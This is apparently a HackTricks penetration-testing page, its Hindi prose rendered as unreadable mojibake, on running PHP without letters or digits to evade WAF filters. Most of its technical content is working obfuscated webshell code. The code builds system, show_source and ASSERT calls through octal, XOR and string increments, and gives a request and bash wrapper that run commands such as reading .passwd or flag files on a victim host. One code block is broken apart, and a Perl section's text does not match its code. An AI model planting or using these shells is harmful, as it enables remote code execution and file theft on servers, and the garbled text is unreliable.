рдпрджрд┐ рдПрдХ рдкреЗрдЬ рдореЗрдВ рдЖрдк **рдХрд┐рд╕реА рднреА рд╡рд┐рд╖рдпрд╢реАрд▓ рдХрдХреНрд╖рд╛ рдХреЗ рдирдП рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдк RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрдЬ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдФрд░ рдЬрд╛рдиреЗрдВ:

{% content-ref url="php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## рдЕрдХреНрд╖рд░реЛрдВ рдХреЗ рдмрд┐рдирд╛ PHP рдЪрд▓рд╛рдПрдВ

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### рдЕрд╖реНрдЯрдорд╛рдВрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

XOR (Exclusive OR) рдПрдХ рдмрд╛рдЗрдирд░реА рдСрдкрд░реЗрдЯрд░ рд╣реИ рдЬреЛ рджреЛ рдмрд╛рдЗрдирд░реА рд╕рдВрдЦреНрдпрд╛рдУрдВ рдХреЛ рдПрдХ рд╕рд╛рде рд▓реЗрддрд╛ рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдмрд┐рдЯ-рдмрд┐рдЯ XOR рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рджреЛрдиреЛрдВ рдмрд┐рдЯреЛрдВ рдХрд╛ рдорд╛рди рд╕рдорд╛рди рд╣реИ, рддреЛ XOR рдХрд╛ рдкрд░рд┐рдгрд╛рдо 0 рд╣реЛрдЧрд╛, рдФрд░ рдпрджрд┐ рджреЛрдиреЛрдВ рдмрд┐рдЯреЛрдВ рдХрд╛ рдорд╛рди рдЕрд▓рдЧ рд╣реИ, рддреЛ XOR рдХрд╛ рдкрд░рд┐рдгрд╛рдо 1 рд╣реЛрдЧрд╛ред XOR рдСрдкрд░реЗрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдбреЗрдЯрд╛ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди, рдбреЗрдЯрд╛ рдорд╛рд╕реНрдХрд┐рдВрдЧ рдФрд░ рдПрд░рд░ рдбрд┐рдЯреЗрдХреНрд╢рди рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрджрд┐ рд╣рдо рджреЛ рдмрд╛рдЗрдирд░реА рд╕рдВрдЦреНрдпрд╛рдУрдВ рдХреЛ XOR рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╣рдореЗрдВ рдПрдХ рдирдИ рдмрд╛рдЗрдирд░реА рд╕рдВрдЦреНрдпрд╛ рдорд┐рд▓реЗрдЧреА рдЬрд┐рд╕рдореЗрдВ рдкреНрд░рддреНрдпреЗрдХ рдмрд┐рдЯ рдХрд╛ рдорд╛рди рджреЛрдиреЛрдВ рд╕рдВрдЦреНрдпрд╛рдУрдВ рдХреЗ рдмрд┐рдЯ рдХреЗ XOR рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛрдЧрд╛ред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдбреЗрдЯрд╛ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдФрд░ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдпрджрд┐ рд╣рдореЗрдВ рдПрдХ рдмрд╛рдЗрдирд░реА рд╕рдВрдЦреНрдпрд╛ рдХреЛ XOR рдХрд░рдирд╛ рд╣реИ рддреЛ рд╣рдо рдЗрд╕ рдСрдкрд░реЗрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рд╣рдореЗрдВ 1010 рдФрд░ 1100 рдХреЛ XOR рдХрд░рдирд╛ рд╣реИ, рддреЛ рд╣рдореЗрдВ 0110 рдорд┐рд▓реЗрдЧрд╛ред

XOR рдСрдкрд░реЗрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдо рдбреЗрдЯрд╛ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП рд╣рдореЗрдВ рдПрдХ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬрд┐рд╕реЗ рд╣рдо рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде XOR рдХрд░реЗрдВрдЧреЗред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдбреЗрдЯрд╛ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕реА рддрд░рд╣, рд╣рдо рдбреЗрдЯрд╛ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА XOR рдСрдкрд░реЗрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

XOR рдСрдкрд░реЗрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдо рдбреЗрдЯрд╛ рдХреЛ рдорд╛рд╕реНрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП рд╣рдореЗрдВ рдПрдХ рдорд╛рд╕реНрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬрд┐рд╕реЗ рд╣рдо рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде XOR рдХрд░реЗрдВрдЧреЗред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдбреЗрдЯрд╛ рдорд╛рд╕реНрдХрд┐рдВрдЧ рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рддрд░рд╣, рд╣рдо рдбреЗрдЯрд╛ рдХреЛ рдорд╛рд╕реНрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдорд╛рд╕реНрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

XOR рдСрдкрд░реЗрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдо рдПрд░рд░ рдбрд┐рдЯреЗрдХреНрд╢рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП рд╣рдореЗрдВ рдПрдХ рдЪреЗрдХрд╕рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬрд┐рд╕реЗ рд╣рдо рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде XOR рдХрд░реЗрдВрдЧреЗред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдПрд░рд░ рдбрд┐рдЯреЗрдХреНрд╢рди рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рддрд░рд╣, рд╣рдо рдбреЗрдЯрд╛ рдореЗрдВ рдПрд░рд░ рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП XOR рдСрдкрд░реЗрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ┬в___ not needed then $_($__), show_source(.passwd)
```
### XOR рдЖрд╕рд╛рди рд╢реЗрд▓ рдХреЛрдб

[**рдЗрд╕ рд╡реНрд░рд┐рдЯрдЕрдк**](https://mgp25.com/ctf/Web-challenge/) рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЗ рд╕реЗ рдПрдХ рдЖрд╕рд╛рди рд╢реЗрд▓рдХреЛрдб рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
рддреЛ, рдЕрдЧрд░ рдЖрдк **рдЕрдВрдХ рдФрд░ рдЕрдХреНрд╖рд░реЛрдВ рдХреЗ рдмрд┐рдирд╛ рдЕрдирд┐рдпрдорд┐рдд PHP рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рднрд╛рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдирд┐рдпрдорд┐рдд PHP рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
рдПрдХ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рд╕рдордЭ рдХреЗ рд▓рд┐рдП [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match) рджреЗрдЦреЗрдВ

### XOR рд╢реИрд▓рдХреЛрдб (рдЗрдВрджреНрд░рд┐рдп рдореЗрдВ)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### рдкрд░реНрд▓ рдЬреИрд╕рд╛

Perl is a high-level programming language that is known for its powerful text processing capabilities. It is often used for web development and system administration tasks. Perl has a syntax that is similar to C and Unix shell scripting languages, making it easy to learn for those familiar with these languages.

Perl рдХреЛ рдПрдХ рд╣рд╛рдИ-рд▓реЗрд╡рд▓ рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЙрд╕рдХреА рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рдкрд╛рда рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдЕрдХреНрд╕рд░ рд╡реЗрдм рд╡рд┐рдХрд╛рд╕ рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рд╢рд╛рд╕рди рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред Perl рдХрд╛ рд╕рд┐рдВрдЯреИрдХреНрд╕ C рдФрд░ Unix рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рднрд╛рд╖рд╛рдУрдВ рдХреЗ рд╕рдорд╛рди рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЗрд╕реЗ рдЙрди рд▓реЛрдЧреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реАрдЦрдирд╛ рдЖрд╕рд╛рди рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЗрди рднрд╛рд╖рд╛рдУрдВ рдХреЗ рдкрд░рд┐рдЪрд┐рдд рд╣реИрдВред
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT рд╕рдВрдЧреНрд░рд╣**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>
